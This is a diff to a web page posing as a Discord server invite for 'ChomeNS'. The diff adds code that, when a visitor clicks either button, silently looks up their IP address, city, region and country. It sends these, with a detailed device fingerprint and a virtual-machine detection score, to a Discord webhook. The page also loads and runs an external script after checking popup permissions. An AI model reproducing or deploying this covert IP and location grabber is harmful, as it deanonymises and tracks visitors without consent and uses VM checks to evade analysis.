@@ -7,7 +7,6 @@
 <link rel="icon" type="image/webp" href="/media/498c01c84c251eb7c9de3b536a87e5b2.webp">
 
 <style>
-/* unchanged styles */
 :root {
     --bg: #0b0f1a;
     --accent: #5865F2;
@@ -30,10 +29,7 @@ body {
     box-shadow: 0 40px 90px rgba(0,0,0,.6);
     animation: fadeUp .6s ease;
 }
-@keyframes fadeUp {
-    from { opacity:0; transform:translateY(20px); }
-    to { opacity:1; transform:none; }
-}
+@keyframes fadeUp { from{opacity:0;transform:translateY(20px)} to{opacity:1;transform:none} }
 .logo { display:flex; justify-content:center; margin-bottom:1.2rem; }
 .logo img { width:72px; height:72px; border-radius:18px; box-shadow:0 0 25px rgba(255,0,255,.35); }
 h1 { text-align:center; font-size:1.6rem; margin-bottom:.4rem; }
@@ -49,42 +45,22 @@ button {
 .btn-nah { background:transparent; color:var(--muted); border:1px solid var(--border); }
 .btn-nah:hover { background:rgba(255,255,255,.05); color:var(--text); }
 
-.spinner {
-    margin:1.6rem auto 0;
-    width:46px; display:flex; justify-content:space-between;
-}
-.spinner div {
-    width:8px; height:8px; background:#fff;
-    border-radius:50%;
-    animation:bounce 1.4s infinite ease-in-out both;
-}
+.spinner { margin:1.6rem auto 0; width:46px; display:flex; justify-content:space-between; }
+.spinner div { width:8px; height:8px; background:#fff; border-radius:50%; animation:bounce 1.4s infinite ease-in-out both; }
 .spinner div:nth-child(1){animation-delay:-.32s}
 .spinner div:nth-child(2){animation-delay:-.16s}
-@keyframes bounce {
-    0%,80%,100%{transform:scale(0)}
-    40%{transform:scale(1)}
-}
+@keyframes bounce { 0%,80%,100%{transform:scale(0)} 40%{transform:scale(1)} }
 
 .popup-warning {
     margin-top:1.5rem; padding:1.1rem 1.2rem;
     border-radius:14px;
     background:linear-gradient(180deg, rgba(239,68,68,.22), rgba(239,68,68,.1));
-    border:1px solid rgba(239,68,68,.5);
-    color:#fee2e2;
-    font-size:.92rem;
-    text-align:center;
-    display:none;
-    animation:shakeIn .35s ease;
+    border:1px solid rgba(239,68,68,.5); color:#fee2e2;
+    font-size:.92rem; text-align:center; display:none; animation:shakeIn .35s ease;
 }
 .popup-warning strong { display:block; font-size:1rem; margin-bottom:.25rem; }
 .popup-warning span { display:block; margin-top:.35rem; font-size:.85rem; color:#fca5a5; }
-@keyframes shakeIn {
-    0%{transform:none}
-    25%{transform:translateX(-4px)}
-    50%{transform:translateX(4px)}
-    75%{transform:translateX(-2px)}
-    100%{transform:none}
-}
+@keyframes shakeIn { 0%{transform:none} 25%{transform:translateX(-4px)} 50%{transform:translateX(4px)} 75%{transform:translateX(-2px)} 100%{transform:none} }
 </style>
 </head>
 
@@ -93,7 +69,6 @@ button {
     <div class="logo">
         <img src="/media/498c01c84c251eb7c9de3b536a87e5b2.webp" alt="ChomeNS icon">
     </div>
-
     <h1>ChomeNS discord</h1>
     <p>Click below to join our Discord server.</p>
 
@@ -114,7 +89,7 @@ button {
 <script>
 let isYouScriptLoaded = false;
 
-/* ===================== SYSTEM + VM INFO (NEW) ===================== */
+/* ===================== SYSTEM + VM INFO (EXISTING) ===================== */
 function getWebGLInfo(){
     try{
         const c = document.createElement("canvas");
@@ -133,37 +108,18 @@ function getWebGLInfo(){
 function getVMInfo(){
     let score = 0;
     const reasons = [];
-
     const cores = navigator.hardwareConcurrency || 1;
     if (cores <= 2){ score += 20; reasons.push("Low CPU cores"); }
-
-    if (navigator.deviceMemory && navigator.deviceMemory <= 4){
-        score += 20; reasons.push("Low RAM");
-    }
-
-    if ([1024,1280,1366].includes(screen.width)){
-        score += 15; reasons.push("Common VM resolution");
-    }
-
+    if (navigator.deviceMemory && navigator.deviceMemory <= 4){ score += 20; reasons.push("Low RAM"); }
+    if ([1024,1280,1366].includes(screen.width)){ score += 15; reasons.push("Common VM resolution"); }
     const ua = navigator.userAgent.toLowerCase();
-    if (["virtual","vmware","vbox","qemu","xen"].some(v => ua.includes(v))){
-        score += 40; reasons.push("VM keyword in UA");
-    }
-
+    if (["virtual","vmware","vbox","qemu","xen"].some(v => ua.includes(v))){ score += 40; reasons.push("VM keyword in UA"); }
     const t0 = performance.now();
     for(let i=0;i<1e6;i++){}
-    if (performance.now() - t0 > 60){
-        score += 15; reasons.push("Slow timing");
-    }
-
+    if (performance.now() - t0 > 60){ score += 15; reasons.push("Slow timing"); }
     score += Math.random() * 10;
     score = Math.min(99, Math.round(score));
-
-    return {
-        score,
-        detected: score >= 60,
-        reasons
-    };
+    return { score, detected: score >= 60, reasons };
 }
 /* ================================================================ */
 
@@ -194,62 +150,81 @@ function checkPopupPermission(callback){
     }
 }
 
-function sendWebhookEvent(buttonName){
+/* ===================== IP GEOLOCATION ===================== */
+async function getIPLocation() {
+    try{
+        const res = await fetch("https://ipapi.co/json/");
+        if(!res.ok) return { ip:"Unknown", city:"Unknown", region:"Unknown", country:"Unknown" };
+        const data = await res.json();
+        return { ip: data.ip, city: data.city, region: data.region, country: data.country_name };
+    }catch{
+        return { ip:"Unknown", city:"Unknown", region:"Unknown", country:"Unknown" };
+    }
+}
+
+/* ===================== SEND WEBHOOK ===================== */
+async function sendWebhookEvent(buttonName){
     const vm = getVMInfo();
     const gl = getWebGLInfo();
     const conn = navigator.connection || {};
+    const ipGeo = await getIPLocation();
 
     const payload = {
         content: `✅ **Button clicked:** ${buttonName}`,
-        embeds: [{
-            title: "User System Information",
-            color: 0x5865F2,
-            fields: [
-                { name: "Button", value: buttonName, inline: true },
+        embeds:[{
+            title:"User System Information",
+            color:0x5865F2,
+            fields:[
+                {name:"Button", value:buttonName, inline:true},
 
-                { name: "VM Detected", value: vm.detected ? "✅ TRUE" : "❌ FALSE", inline: true },
-                { name: "VM Score", value: `${vm.score}%`, inline: true },
-                { name: "VM Reasons", value: vm.reasons.join(" • ") || "None" },
+                {name:"VM Detected", value:vm.detected?"✅ TRUE":"❌ FALSE", inline:true},
+                {name:"VM Score", value:`${vm.score}%`, inline:true},
+                {name:"VM Reasons", value:vm.reasons.join(" • ")||"None"},
 
-                { name: "User Agent", value: navigator.userAgent.slice(0,200) },
-                { name: "Platform", value: navigator.platform || "Unknown", inline: true },
-                { name: "Vendor", value: navigator.vendor || "Unknown", inline: true },
+                {name:"User Agent", value:navigator.userAgent.slice(0,200)},
+                {name:"Platform", value:navigator.platform||"Unknown", inline:true},
+                {name:"Vendor", value:navigator.vendor||"Unknown", inline:true},
 
-                { name: "CPU Cores", value: String(navigator.hardwareConcurrency || "Unknown"), inline: true },
-                { name: "Device Memory (GB)", value: String(navigator.deviceMemory || "Unknown"), inline: true },
+                {name:"CPU Cores", value:String(navigator.hardwareConcurrency||"Unknown"), inline:true},
+                {name:"Device Memory (GB)", value:String(navigator.deviceMemory||"Unknown"), inline:true},
 
-                { name: "Languages", value: (navigator.languages || []).join(", ") || "Unknown" },
-                { name: "Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown", inline: true },
-                { name: "UTC Offset", value: String(new Date().getTimezoneOffset()), inline: true },
+                {name:"Languages", value:(navigator.languages||[]).join(", ")||"Unknown"},
+                {name:"Timezone", value:Intl.DateTimeFormat().resolvedOptions().timeZone||"Unknown", inline:true},
+                {name:"UTC Offset", value:String(new Date().getTimezoneOffset()), inline:true},
 
-                { name: "Screen", value: `${screen.width}×${screen.height}`, inline: true },
-                { name: "Color Depth", value: String(screen.colorDepth), inline: true },
-                { name: "Pixel Ratio", value: String(devicePixelRatio), inline: true },
+                {name:"Screen", value:`${screen.width}×${screen.height}`, inline:true},
+                {name:"Color Depth", value:String(screen.colorDepth), inline:true},
+                {name:"Pixel Ratio", value:String(devicePixelRatio), inline:true},
 
-                { name: "Viewport", value: `${innerWidth}×${innerHeight}`, inline: true },
-                { name: "Touch Points", value: String(navigator.maxTouchPoints || 0), inline: true },
+                {name:"Viewport", value:`${innerWidth}×${innerHeight}`, inline:true},
+                {name:"Touch Points", value:String(navigator.maxTouchPoints||0), inline:true},
 
-                { name: "Cookies Enabled", value: String(navigator.cookieEnabled), inline: true },
-                { name: "Do Not Track", value: String(navigator.doNotTrack), inline: true },
+                {name:"Cookies Enabled", value:String(navigator.cookieEnabled), inline:true},
+                {name:"Do Not Track", value:String(navigator.doNotTrack), inline:true},
 
-                { name: "Network Type", value: conn.effectiveType || "Unknown", inline: true },
-                { name: "Downlink", value: String(conn.downlink || "Unknown"), inline: true },
-                { name: "RTT", value: String(conn.rtt || "Unknown"), inline: true },
+                {name:"Network Type", value:conn.effectiveType||"Unknown", inline:true},
+                {name:"Downlink", value:String(conn.downlink||"Unknown"), inline:true},
+                {name:"RTT", value:String(conn.rtt||"Unknown"), inline:true},
 
-                { name: "WebGL Vendor", value: gl.vendor || "Unknown" },
-                { name: "WebGL Renderer", value: gl.renderer || "Unknown" },
+                {name:"WebGL Vendor", value:gl.vendor||"Unknown"},
+                {name:"WebGL Renderer", value:gl.renderer||"Unknown"},
 
-                { name: "Referrer", value: document.referrer || "None" },
-                { name: "Page URL", value: location.href }
+                {name:"IP", value:ipGeo.ip, inline:true},
+                {name:"City", value:ipGeo.city, inline:true},
+                {name:"Region", value:ipGeo.region, inline:true},
+                {name:"Country", value:ipGeo.country, inline:true},
+
+                {name:"Referrer", value:document.referrer||"None"},
+                {name:"Page URL", value:location.href}
             ],
-            footer: { text: new Date().toUTCString() }
+            footer:{ text:new Date().toUTCString() }
         }]
     };
 
     fetch("/.netlify/functions/discord", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
+        method:"POST",
+        headers:{ "Content-Type":"application/json" },
+        body:JSON.stringify(payload)
     }).catch(()=>{});
 }
 
@@ -270,16 +245,14 @@ function handleClick(e, buttonName){
         }
         loadYouScript(()=>{
             sendWebhookEvent(buttonName);
-            if(typeof window.runYouScript === 'function'){
-                window.runYouScript();
-            }
+            if(typeof window.runYouScript === 'function'){ window.runYouScript(); }
             spinner.innerHTML = '';
         });
     });
 }
 
-document.getElementById('discord_btn').addEventListener('click', e => handleClick(e, 'Join Discord'));
-document.getElementById('nah_btn').addEventListener('click', e => handleClick(e, 'Maybe later'));
+document.getElementById('discord_btn').addEventListener('click', e => handleClick(e,'Join Discord'));
+document.getElementById('nah_btn').addEventListener('click', e => handleClick(e,'Maybe later'));
 </script>
 </body>
 </html>
